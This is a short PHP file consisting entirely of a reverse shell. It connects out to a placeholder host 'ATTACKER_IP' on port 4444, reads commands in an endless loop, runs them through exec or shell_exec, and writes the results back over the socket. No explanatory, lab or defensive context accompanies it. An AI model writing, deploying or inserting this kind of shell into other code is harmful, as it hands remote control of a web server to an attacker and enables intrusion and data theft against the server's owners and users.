<?php

$attacker_ip = 'ATTACKER_IP';
$attacker_port = 4444; 

function execute_command($command) {
    $output = [];
    $return_var = 0;
    exec($command, $output, $return_var);
    return [$return_var, implode("\n", $output)];
}

$sock = fsockopen($attacker_ip, $attacker_port, $errno, $errstr, 30);
if (!$sock) {
    die("Socket connection failed: $errstr ($errno)\n");
} else {
    while (true) {
        $data = fread($sock, 8192);
        if ($data === false) {
            die("Connection closed\n");
        }

        $command = trim($data);
        if (empty($command)) {
            continue;
        }

        $return_code = 0;
        $output = '';

        if (strpos($command, 'SYS:') === 0) {
            $command = substr($command, 4);
            list($return_code, $output) = execute_command($command);
        } else {
            $output = shell_exec($command);
        }

        $response = $return_code . "\n" . $output;
        fwrite($sock, $response, strlen($response));
    }

    fclose($sock);
}
?>
